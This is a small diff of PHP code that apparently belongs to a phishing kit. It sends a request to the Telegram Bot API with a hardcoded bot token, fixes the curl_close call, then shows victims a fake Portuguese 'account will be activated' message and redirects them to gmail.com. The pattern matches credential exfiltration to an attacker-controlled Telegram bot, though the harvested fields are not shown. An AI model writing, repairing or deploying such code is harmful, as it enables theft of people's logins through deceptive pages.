@@ -16,7 +16,7 @@ curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot1828850191:AAG226rbc0
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 $exec = curl_exec($ch);
-curl_close($exec);
+curl_close($ch);
 
 echo "<script>alert('Solicitação feita com sucesso, analisaremos a sua conta e a ativaremos em breve.');window.location.href='https://gmail.com'</script>";
 
